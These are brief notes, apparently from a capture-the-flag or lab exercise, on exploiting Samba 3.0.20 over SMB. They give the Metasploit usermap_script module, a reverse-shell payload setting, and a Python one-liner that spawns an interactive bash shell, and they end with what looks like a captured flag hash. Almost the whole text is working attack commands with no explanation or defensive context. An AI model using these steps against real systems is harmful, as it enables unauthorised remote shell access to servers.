exploit smb with samba 3.0.20

`use exploit/multi/samba/usermap_script`

`set payload cmd/unix/reverse`

`python -c 'import pty; pty.spawn("/bin/bash")'`

to get out of shell

92caac3be140ef409e45721348a4e9df